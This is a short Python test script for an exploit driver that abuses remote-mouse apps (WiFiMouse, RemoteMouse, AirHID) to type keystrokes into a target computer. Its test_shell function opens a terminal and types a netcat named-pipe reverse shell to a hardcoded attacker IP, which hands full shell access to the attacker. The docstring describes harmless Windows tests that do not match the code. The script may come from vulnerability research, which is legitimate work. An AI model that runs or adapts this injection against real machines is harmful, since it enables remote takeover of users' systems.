import sys
from time import sleep

## Change this line to use a different driver
## Format is from <folder_name>.<app_name>_driver import <driver_name> as current_driver
from WiFiMouse.wifimouse_driver import WiFiMouseDriver as current_driver
##from RemoteMouse.remote_mouse_driver import RemoteMouseDriver as current_driver
##from AirHID.airhid_driver import AirHidDriver as current_driver

IP = '18.111.9.28'
attackerIP = '18.250.6.132'

"""
Tests the exploit driver by:
    - opening the Windows start menu
    - opening Yahoo in the primary web browser

The tests are meant to be run on Windows 7.

When running the test, you can specify the IP address of the system to be
exploited as the first command-line parameter.
"""

def main():
    if len(sys.argv) >= 2:
        ip = sys.argv[1]
    else:
        ip = IP

    r = current_driver(ip)

    tests = [test_shell]

    for run in tests:
        clean_environment(r)
        run(r)
        sleep(10)

    r.close()

def clean_environment(r):
    r.move_mouse(-2000,-2000)

"""
Open a reverse shell on the linux system, allowing us full control on the user space
"""
def test_shell(r):
    r.left_click()
    r.typeText("terminal")
    r.press_action_key('ENTER')
    r.typeText("mknod backpipe p && nc " + attackerIP + " 0<backpipe " \
               + "| /bin/bash 1>backpipe")
    r.press_action_key('ENTER')


if __name__ == "__main__":
    main()
